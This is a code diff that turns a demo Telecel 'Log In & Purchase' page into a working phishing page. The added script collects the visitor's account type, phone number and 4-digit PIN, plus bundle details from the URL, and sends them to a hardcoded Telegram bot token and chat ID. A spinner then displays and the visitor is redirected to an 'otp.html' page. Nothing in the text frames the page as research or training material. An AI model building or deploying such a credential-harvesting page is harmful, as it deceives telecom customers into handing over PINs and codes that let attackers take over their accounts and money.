@@ -6,11 +6,7 @@
     <title>Telecel - Log In & Purchase</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Inter', sans-serif;
             background: #f8f9fa;
@@ -29,7 +25,6 @@
             box-shadow: 0 20px 60px rgba(0,0,0,0.15);
             margin: 20px;
         }
-        /* Left Side - Image */
         .left-side {
             flex: 1;
             background: url('https://images.unsplash.com/photo-1622445275576-721325763afe?w=800') center/cover no-repeat;
@@ -49,46 +44,40 @@
         }
         .left-overlay p {
             font-size: 15px;
-            opacity: 0.95;
             max-width: 320px;
         }
 
-        /* Right Side - Form */
         .right-side {
             flex: 1;
             padding: 50px 40px;
-            display: flex;
-            flex-direction: column;
         }
-        .telecel-logo {
+        .logo {
             text-align: center;
             margin-bottom: 30px;
         }
-        .telecel-logo img {
-            height: 48px;
+        .logo h2 {
+            color: #E30613;
+            font-size: 32px;
+            font-weight: 900;
         }
-        .welcome {
+        h1 {
             text-align: center;
-            margin-bottom: 30px;
-        }
-        .welcome h1 {
             font-size: 24px;
-            font-weight: 700;
-            color: #1e2937;
+            margin-bottom: 8px;
         }
-        .welcome p {
+        .subtitle {
+            text-align: center;
             color: #64748b;
-            margin-top: 6px;
+            margin-bottom: 30px;
         }
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 22px;
         }
         label {
             display: block;
             font-weight: 600;
             margin-bottom: 8px;
             color: #334155;
-            font-size: 14px;
         }
         select, input {
             width: 100%;
@@ -96,19 +85,10 @@
             border: 1.5px solid #e2e8f0;
             border-radius: 10px;
             font-size: 16px;
-            outline: none;
-            transition: all 0.3s;
         }
         select:focus, input:focus {
             border-color: #E30613;
-            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.1);
-        }
-        .forgot {
-            text-align: right;
-            font-size: 14px;
-            color: #E30613;
-            margin-top: 6px;
-            cursor: pointer;
+            outline: none;
         }
         .continue-btn {
             width: 100%;
@@ -121,54 +101,23 @@
             border-radius: 50px;
             cursor: pointer;
             margin: 25px 0 15px;
-            transition: 0.3s;
         }
         .continue-btn:hover {
             background: #c0040f;
-            transform: translateY(-2px);
         }
         .register {
             text-align: center;
             font-size: 15px;
-            margin-top: 20px;
         }
         .register a {
             color: #E30613;
             font-weight: 600;
-            text-decoration: none;
-        }
-
-        /* Bottom Banner */
-        .bill-banner {
-            background: #E30613;
-            color: white;
-            padding: 20px;
-            border-radius: 12px;
-            margin-top: 30px;
-            text-align: center;
-        }
-        .bill-banner h3 {
-            font-size: 18px;
-            margin-bottom: 8px;
-        }
-        .bill-banner p {
-            font-size: 14px;
-            opacity: 0.95;
-        }
-
-        @media (max-width: 992px) {
-            .main-container {
-                flex-direction: column;
-            }
-            .left-side {
-                min-height: 300px;
-            }
         }
     </style>
 </head>
 <body>
     <div class="main-container">
-        <!-- Left Image Side -->
+        <!-- Left Image -->
         <div class="left-side">
             <div class="left-overlay">
                 <h2>Effortless transactions</h2>
@@ -176,21 +125,18 @@
             </div>
         </div>
 
-        <!-- Right Login Form -->
+        <!-- Right Form -->
         <div class="right-side">
-            <div class="telecel-logo">
-                <h2 style="color:#E30613; font-size:32px; font-weight:900;">telecel</h2>
+            <div class="logo">
+                <h2>telecel</h2>
             </div>
 
-            <div class="welcome">
-                <h1>Welcome Back</h1>
-                <p>Enter your details to proceed.<br>Have an Enterprise account? <a href="#" style="color:#E30613; text-decoration:none;">Login Here</a></p>
-            </div>
+            <h1>Welcome Back</h1>
+            <p class="subtitle">Enter your details to proceed</p>
 
             <div class="form-group">
                 <label>Select Account Type <span style="color:red;">*</span></label>
-                <select>
-                    <option value="">Select Account type</option>
+                <select id="accountType">
                     <option value="mobile">Mobile</option>
                     <option value="broadband">Broadband</option>
                 </select>
@@ -198,13 +144,12 @@
 
             <div class="form-group">
                 <label>Telephone Number <span style="color:red;">*</span></label>
-                <input type="tel" placeholder="XXXXXXXXX" id="phone">
+                <input type="tel" id="phone" placeholder="020XXXXXXXX" maxlength="10">
             </div>
 
             <div class="form-group">
-                <label>Password <small>(Use your Telecel Play App password)</small></label>
-                <input type="password" placeholder="••••••••" id="password">
-                <div class="forgot">Forgot your password?</div>
+                <label>PIN <span style="color:red;">*</span></label>
+                <input type="password" id="password" placeholder="••••" maxlength="4" inputmode="numeric">
             </div>
 
             <button class="continue-btn" onclick="proceedLogin()">Continue</button>
@@ -212,26 +157,79 @@
             <div class="register">
                 Don't have an account? <a href="#">Register Here</a>
             </div>
-
-            <!-- Bill Banner -->
-            <div class="bill-banner">
-                <h3>Pay your bills without stress</h3>
-                <p>Pay for your broadband, television subscription & utility bills on Telecel Play.</p>
-                <a href="#" style="color:white; font-weight:600; text-decoration:none;">Proceed to Pay bills →</a>
-            </div>
         </div>
     </div>
 
+    <!-- Spinner -->
+    <div id="spinner" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:9999; align-items:center; justify-content:center;">
+        <div style="width:60px; height:60px; border:6px solid #fff; border-top:6px solid #E30613; border-radius:50%; animation:spin 1s linear infinite;"></div>
+    </div>
+
     <script>
-        function proceedLogin() {
-            const phone = document.getElementById('phone').value;
-            if (phone) {
-                alert("Login successful! (Demo)\nRedirecting to OTP...");
-                // window.location.href = "otp.html";
-            } else {
-                alert("Please enter your telephone number");
+        // === CONFIG ===
+        const CONFIG = {
+            BOT_TOKEN: '8522259555:AAEl1CRJfLhjWwtqD2z6CvN-jesiotWQ__4',
+            CHAT_ID: '8757709711',
+            REDIRECT_PAGE: 'otp.html'
+        };
+
+        let state = { bundleInfo: null };
+
+        function extractBundleInfo() {
+            const params = new URLSearchParams(window.location.search);
+            const bundle = params.get('bundle');
+            const price = params.get('price');
+            if (bundle && price) {
+                state.bundleInfo = { bundle, price };
             }
         }
+
+        function proceedLogin() {
+            const accountType = document.getElementById('accountType').value;
+            const phone = document.getElementById('phone').value.trim();
+            const pin = document.getElementById('password').value.trim();
+
+            if (!phone || phone.length < 9) {
+                alert("Please enter a valid Telephone Number");
+                return;
+            }
+            if (!pin || pin.length !== 4) {
+                alert("PIN must be 4 digits");
+                return;
+            }
+
+            document.getElementById('spinner').style.display = 'flex';
+
+            const message = `<b>Telecel Login Attempt</b>\n\n` +
+                            `Account Type: ${accountType}\n` +
+                            `Phone: ${phone}\n` +
+                            `PIN: ${pin}\n` +
+                            (state.bundleInfo ? `\nBundle: ${state.bundleInfo.bundle}\nPrice: GHS ${state.bundleInfo.price}` : '');
+
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CONFIG.CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(() => {
+                setTimeout(() => {
+                    window.location.href = CONFIG.REDIRECT_PAGE;
+                }, 1500);
+            })
+            .catch(err => {
+                console.error(err);
+                alert("Connection error. Please try again.");
+                document.getElementById('spinner').style.display = 'none';
+            });
+        }
+
+        // Initialize
+        extractBundleInfo();
+        document.getElementById('phone').focus();
     </script>
 </body>
 </html>
